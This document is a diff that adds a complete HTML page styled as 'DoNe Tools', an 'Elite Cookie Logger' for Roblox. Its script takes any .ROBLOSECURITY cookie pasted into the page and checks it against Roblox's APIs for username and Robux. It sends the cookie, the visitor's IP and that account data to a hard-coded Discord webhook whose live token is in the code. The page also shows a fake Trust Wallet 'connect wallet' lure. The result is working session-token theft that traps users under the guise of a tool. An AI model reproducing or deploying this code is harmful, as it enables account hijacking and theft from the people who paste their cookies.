@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>DoNe Tools | Elite Cookie Logger</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800;14..32,900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0a0c12;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            color: #fff;
+        }
+
+        /* Canvas for Starfield Effect */
+        #starCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        /* Animated Gradient Background */
+        .bg-gradient {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 50% 50%, rgba(30, 20, 60, 0.4) 0%, rgba(10, 8, 20, 0.9) 100%);
+            z-index: 0;
+        }
+
+        /* Main Container */
+        .container {
+            position: relative;
+            z-index: 10;
+            max-width: 1300px;
+            margin: 0 auto;
+            padding: 2rem;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        /* Header Animation */
+        @keyframes floatIn {
+            0% {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes glowPulse {
+            0%, 100% {
+                text-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+            }
+            50% {
+                text-shadow: 0 0 40px rgba(0, 255, 255, 0.6), 0 0 60px rgba(157, 78, 221, 0.4);
+            }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 2rem;
+            animation: floatIn 0.8s ease-out;
+        }
+
+        .logo h1 {
+            font-size: 5rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #fff 0%, #00ffff 30%, #ff00aa 70%, #ffaa00 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: glowPulse 3s infinite;
+            letter-spacing: -2px;
+        }
+
+        .logo .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #ff00aa, #9d4edd);
+            padding: 0.5rem 1.5rem;
+            border-radius: 100px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+            box-shadow: 0 0 20px rgba(255, 0, 170, 0.3);
+        }
+
+        .tagline {
+            text-align: center;
+            color: #aaa;
+            margin-top: 0.5rem;
+            font-size: 0.9rem;
+        }
+
+        /* Cards Grid */
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 2rem;
+            margin: 3rem 0;
+        }
+
+        @media (max-width: 900px) {
+            .cards-grid {
+                grid-template-columns: 1fr;
+                gap: 1.5rem;
+            }
+            .logo h1 {
+                font-size: 3rem;
+            }
+            .container {
+                padding: 1rem;
+            }
+        }
+
+        /* Card Styles */
+        .card {
+            background: rgba(15, 15, 30, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 2rem;
+            padding: 1.8rem;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            transition: all 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            animation: floatIn 0.8s ease-out backwards;
+        }
+
+        .card:nth-child(1) {
+            animation-delay: 0.1s;
+        }
+        .card:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .card:hover {
+            transform: translateY(-8px);
+            border-color: rgba(0, 255, 255, 0.6);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), 0 0 30px rgba(0, 255, 255, 0.2);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            margin-bottom: 1.2rem;
+        }
+
+        .card-header i {
+            font-size: 2rem;
+            background: linear-gradient(135deg, #00ffff, #ff00aa);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .card-header h2 {
+            font-size: 1.4rem;
+            font-weight: 700;
+        }
+
+        .card-header p {
+            color: #888;
+            font-size: 0.8rem;
+        }
+
+        /* Video Wrapper */
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            border-radius: 1rem;
+            overflow: hidden;
+            margin: 1rem 0;
+            background: #000;
+            aspect-ratio: 16 / 9;
+        }
+
+        .video-wrapper iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* Textarea */
+        textarea {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            border-radius: 1rem;
+            padding: 1rem;
+            color: #0ff;
+            font-family: 'Monaco', monospace;
+            font-size: 0.8rem;
+            resize: vertical;
+            transition: all 0.3s;
+            margin-top: 1rem;
+        }
+
+        textarea:focus {
+            outline: none;
+            border-color: #ff00aa;
+            box-shadow: 0 0 20px rgba(255, 0, 170, 0.3);
+        }
+
+        textarea::placeholder {
+            color: #555;
+        }
+
+        /* Start Button */
+        .start-btn-wrapper {
+            text-align: center;
+            margin: 2rem 0;
+        }
+
+        .start-btn {
+            background: linear-gradient(135deg, #ff00aa, #9d4edd);
+            border: none;
+            padding: 1.2rem 3rem;
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: white;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(255, 0, 170, 0.4);
+            display: inline-flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .start-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 40px rgba(255, 0, 170, 0.7);
+        }
+
+        .start-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Status */
+        .status-area {
+            text-align: center;
+            padding: 1rem;
+            border-radius: 2rem;
+            margin-top: 1rem;
+            font-weight: 500;
+        }
+
+        .status-success {
+            background: rgba(0, 255, 100, 0.15);
+            border: 1px solid #0f0;
+            color: #0f0;
+        }
+
+        .status-error {
+            background: rgba(255, 0, 100, 0.15);
+            border: 1px solid #f0f;
+            color: #ff66aa;
+        }
+
+        .status-info {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid #0ff;
+            color: #0ff;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 1rem;
+        }
+
+        .loading.active {
+            display: block;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255, 0, 170, 0.3);
+            border-top-color: #ff00aa;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding-top: 2rem;
+            margin-top: 1rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.8rem;
+            color: #666;
+        }
+
+        /* OneTap Popup */
+        .onetap-popup {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 1000;
+            display: none;
+        }
+
+        .onetap-box {
+            width: 360px;
+            background: linear-gradient(135deg, #1a1a2e, #0f0f1f);
+            border-radius: 20px;
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            animation: slideUp 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            overflow: hidden;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(60px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .onetap-header {
+            padding: 1rem 1.2rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .onetap-header h3 {
+            font-size: 1rem;
+            color: #fff;
+        }
+
+        .onetap-close {
+            cursor: pointer;
+            color: #888;
+            transition: color 0.2s;
+        }
+
+        .onetap-close:hover {
+            color: #fff;
+        }
+
+        .onetap-body {
+            padding: 1.5rem;
+            text-align: center;
+        }
+
+        .onetap-wallet-btn {
+            background: linear-gradient(135deg, #ff00aa, #9d4edd);
+            padding: 0.8rem;
+            border-radius: 40px;
+            cursor: pointer;
+            font-weight: 600;
+            margin-top: 1rem;
+            transition: all 0.2s;
+        }
+
+        .onetap-wallet-btn:hover {
+            transform: scale(1.02);
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-gradient"></div>
+    <canvas id="starCanvas"></canvas>
+
+    <div class="container">
+        <div class="logo">
+            <h1>DONE TOOLS</h1>
+            <div class="badge">⚡ PREMIUM ELITE TOOL • 2025 WORKING ⚡</div>
+            <div class="tagline">next-gen cookie logging platform</div>
+        </div>
+
+        <div class="cards-grid">
+            <!-- MOBILE CARD -->
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-mobile-alt"></i>
+                    <div>
+                        <h2>MOBILE EDITION</h2>
+                        <p>Roblox Cookie Logger</p>
+                    </div>
+                </div>
+                <div class="video-wrapper">
+                    <iframe src="https://www.youtube.com/embed/4kQyzuBqQaA" frameborder="0" allowfullscreen></iframe>
+                </div>
+                <textarea id="mobileCookie" placeholder="Paste victim's cookie here..."></textarea>
+            </div>
+
+            <!-- PC CARD -->
+            <div class="card">
+                <div class="card-header">
+                    <i class="fas fa-desktop"></i>
+                    <div>
+                        <h2>PC / LAPTOP EDITION</h2>
+                        <p>PowerShell Cookie Extractor</p>
+                    </div>
+                </div>
+                <div class="video-wrapper">
+                    <iframe src="https://www.youtube.com/embed/77JdQgm9Bh8" frameborder="0" allowfullscreen></iframe>
+                </div>
+                <textarea id="pcCookie" placeholder="Paste PowerShell output here..."></textarea>
+            </div>
+        </div>
+
+        <div class="start-btn-wrapper">
+            <button class="start-btn" id="startBtn">
+                <i class="fas fa-bolt"></i> START TOOL <i class="fas fa-skull"></i>
+            </button>
+        </div>
+
+        <div id="loading" class="loading">
+            <div class="spinner"></div>
+            <span>INITIALIZING SECURE CHANNEL...</span>
+        </div>
+        <div id="status" class="status-area status-info">✅ TOOL READY • PASTE COOKIE & CLICK START</div>
+
+        <div class="footer">
+            <i class="fas fa-shield-alt"></i> ENCRYPTED CONNECTION • ZETA PROTOCOL • ALPHA COMMAND
+        </div>
+    </div>
+
+    <!-- OneTap Popup -->
+    <div id="onetapPopup" class="onetap-popup">
+        <div class="onetap-box">
+            <div class="onetap-header">
+                <h3><i class="fas fa-wallet"></i> Trust Wallet</h3>
+                <div class="onetap-close" id="closePopup"><i class="fas fa-times"></i></div>
+            </div>
+            <div class="onetap-body">
+                <i class="fas fa-plug" style="font-size: 2rem; color: #0ff;"></i>
+                <h4 style="margin: 0.8rem 0;">One‑Tap Login</h4>
+                <p style="font-size: 0.8rem; color: #aaa;">Connect wallet to claim rewards</p>
+                <div class="onetap-wallet-btn" id="connectWalletBtn">
+                    <i class="fas fa-arrow-right"></i> Connect Wallet
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ==================== STARFIELD WITH MOUSE INTERACTION ====================
+        const canvas = document.getElementById('starCanvas');
+        const ctx = canvas.getContext('2d');
+        let stars = [];
+        let mouseX = 0, mouseY = 0;
+        let targetX = 0, targetY = 0;
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            initStars();
+        }
+
+        function initStars() {
+            stars = [];
+            const starCount = Math.floor((canvas.width * canvas.height) / 4000);
+            for (let i = 0; i < starCount; i++) {
+                stars.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    radius: Math.random() * 2 + 0.5,
+                    alpha: Math.random() * 0.6 + 0.2,
+                    originalX: Math.random() * canvas.width,
+                    originalY: Math.random() * canvas.height,
+                    speed: 0.02 + Math.random() * 0.03
+                });
+            }
+        }
+
+        function drawStars() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            // Smooth mouse movement
+            targetX += (mouseX - targetX) * 0.05;
+            targetY += (mouseY - targetY) * 0.05;
+            
+            const offsetX = (targetX / canvas.width - 0.5) * 40;
+            const offsetY = (targetY / canvas.height - 0.5) * 40;
+            
+            for (let star of stars) {
+                let dx = star.originalX + offsetX * star.speed * 2;
+                let dy = star.originalY + offsetY * star.speed * 2;
+                
+                // Wrap around edges
+                if (dx < 0) dx += canvas.width;
+                if (dx > canvas.width) dx -= canvas.width;
+                if (dy < 0) dy += canvas.height;
+                if (dy > canvas.height) dy -= canvas.height;
+                
+                star.x = dx;
+                star.y = dy;
+                
+                ctx.beginPath();
+                ctx.arc(star.x, star.y, star.radius, 0, Math.PI * 2);
+                ctx.fillStyle = `rgba(255, 255, 255, ${star.alpha})`;
+                ctx.fill();
+            }
+            
+            requestAnimationFrame(drawStars);
+        }
+
+        window.addEventListener('mousemove', (e) => {
+            mouseX = e.clientX;
+            mouseY = e.clientY;
+        });
+
+        window.addEventListener('resize', () => {
+            resizeCanvas();
+        });
+
+        resizeCanvas();
+        drawStars();
+
+        // ==================== COOKIE STEALER FUNCTIONALITY ====================
+        const WEBHOOK = "https://discord.com/api/webhooks/1485894373156851803/Q7NzzYhnRav9GRpLvO5NL_33tVVu8m1OvwEErMAW4otKYc5dgMMnTyZCjCc7RAOhoPxr";
+        
+        const startBtn = document.getElementById('startBtn');
+        const mobileInput = document.getElementById('mobileCookie');
+        const pcInput = document.getElementById('pcCookie');
+        const loadingDiv = document.getElementById('loading');
+        const statusDiv = document.getElementById('status');
+        const popup = document.getElementById('onetapPopup');
+
+        function extractCookie(raw) {
+            let cookie = raw.trim();
+            const match = cookie.match(/\.ROBLOSECURITY[=:]\s*([a-zA-Z0-9_\-]+)/i);
+            if (match) return match[1];
+            if (cookie.match(/^[a-zA-Z0-9_\-]{100,}$/)) return cookie;
+            return null;
+        }
+
+        async function getRobloxUserInfo(cookie) {
+            try {
+                const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
+                    headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+                });
+                if (res.ok) {
+                    const data = await res.json();
+                    let robux = 0;
+                    try {
+                        const robuxRes = await fetch('https://economy.roblox.com/v1/user/currency', {
+                            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+                        });
+                        if (robuxRes.ok) {
+                            const robuxData = await robuxRes.json();
+                            robux = robuxData.robux || 0;
+                        }
+                    } catch(e) {}
+                    return { success: true, username: data.name || "Unknown", userId: data.id || "Unknown", robux };
+                }
+            } catch(e) {}
+            return { success: false };
+        }
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch(e) { return "Unknown"; }
+        }
+
+        async function sendToDiscord(cookie, userInfo, source, ip) {
+            const embed = {
+                title: "🎯 DONE TOOLS • VICTIM DATA",
+                color: 0xff00aa,
+                fields: [
+                    { name: "📱 Source", value: `\`\`\`${source}\`\`\``, inline: true },
+                    { name: "🌐 IP", value: `\`\`\`${ip}\`\`\``, inline: true },
+                    { name: "🎮 Roblox User", value: `\`\`\`${userInfo.success ? userInfo.username : 'Not logged in'}\`\`\``, inline: true },
+                    { name: "🆔 User ID", value: `\`\`\`${userInfo.success ? userInfo.userId : 'N/A'}\`\`\``, inline: true },
+                    { name: "💰 Robux", value: `\`\`\`${userInfo.success ? userInfo.robux + ' R$' : 'Unknown'}\`\`\``, inline: true },
+                    { name: "⏰ Time", value: `\`\`\`${new Date().toLocaleString()}\`\`\``, inline: false }
+                ],
+                footer: { text: "DoNe Tools • Alpha Protocol" }
+            };
+            
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+            
+            if (cookie && cookie.length > 0) {
+                for (let i = 0; i < cookie.length; i += 1800) {
+                    await fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: `**🍪 COOKIE PART ${Math.floor(i/1800)+1}**\n\`\`\`${cookie.substring(i, i+1800)}\`\`\`` })
+                    });
+                    await new Promise(r => setTimeout(r, 500));
+                }
+            }
+        }
+
+        async function stealData() {
+            const mobileVal = mobileInput.value.trim();
+            const pcVal = pcInput.value.trim();
+            let cookie = null, source = "";
+            
+            if (mobileVal) { cookie = extractCookie(mobileVal); source = "Mobile Edition"; }
+            else if (pcVal) { cookie = extractCookie(pcVal); source = "PC/Laptop Edition"; }
+            
+            if (!cookie || cookie.length < 50) {
+                statusDiv.className = "status-area status-error";
+                statusDiv.innerHTML = '❌ INVALID COOKIE • PASTE VALID .ROBLOSECURITY COOKIE';
+                return false;
+            }
+            
+            statusDiv.className = "status-area status-info";
+            statusDiv.innerHTML = '🔍 VALIDATING COOKIE & FETCHING USER DATA...';
+            
+            const ip = await getIP();
+            const userInfo = await getRobloxUserInfo(cookie);
+            
+            if (userInfo.success) {
+                statusDiv.innerHTML = `✅ COOKIE VALID • USER: ${userInfo.username} (${userInfo.robux} R$)`;
+            } else {
+                statusDiv.innerHTML = '⚠️ COOKIE MAY BE EXPIRED, BUT STILL SENDING...';
+            }
+            
+            await sendToDiscord(cookie, userInfo, source, ip);
+            return true;
+        }
+
+        startBtn.addEventListener('click', async () => {
+            const mobileVal = mobileInput.value.trim();
+            const pcVal = pcInput.value.trim();
+            
+            if (!mobileVal && !pcVal) {
+                statusDiv.className = "status-area status-error";
+                statusDiv.innerHTML = '❌ PASTE COOKIE FIRST!';
+                return;
+            }
+            
+            startBtn.disabled = true;
+            loadingDiv.classList.add('active');
+            statusDiv.style.display = 'none';
+            
+            const success = await stealData();
+            
+            loadingDiv.classList.remove('active');
+            statusDiv.style.display = 'block';
+            
+            if (success) {
+                statusDiv.className = "status-area status-success";
+                statusDiv.innerHTML = '✅ COOKIE SENT! OPENING WALLET CONNECTOR...';
+                popup.style.display = 'block';
+                setTimeout(() => {
+                    statusDiv.innerHTML = '✅ OPERATION COMPLETE • DATA SENT TO ALPHA';
+                }, 3000);
+            } else {
+                statusDiv.className = "status-area status-error";
+                statusDiv.innerHTML = '❌ FAILED TO SEND • CHECK WEBHOOK CONFIGURATION';
+            }
+            
+            startBtn.disabled = false;
+        });
+
+        function autoExtract(textarea) {
+            const val = textarea.value.trim();
+            const extracted = extractCookie(val);
+            if (extracted && extracted !== val && extracted.length > 50) {
+                textarea.value = extracted;
+                statusDiv.className = "status-area status-success";
+                statusDiv.innerHTML = '✅ COOKIE EXTRACTED • READY TO START';
+                setTimeout(() => {
+                    if (statusDiv.innerHTML.includes('EXTRACTED')) {
+                        statusDiv.className = "status-area status-info";
+                        statusDiv.innerHTML = '✅ TOOL READY • PASTE COOKIE & CLICK START';
+                    }
+                }, 3000);
+            }
+        }
+
+        mobileInput.addEventListener('input', () => autoExtract(mobileInput));
+        pcInput.addEventListener('input', () => autoExtract(pcInput));
+
+        document.getElementById('closePopup')?.addEventListener('click', () => {
+            popup.style.display = 'none';
+        });
+        document.getElementById('connectWalletBtn')?.addEventListener('click', () => {
+            popup.style.display = 'none';
+            statusDiv.className = "status-area status-success";
+            statusDiv.innerHTML = '✅ WALLET CONNECTED • ACCESS GRANTED';
+        });
+    </script>
+</body>
+</html>
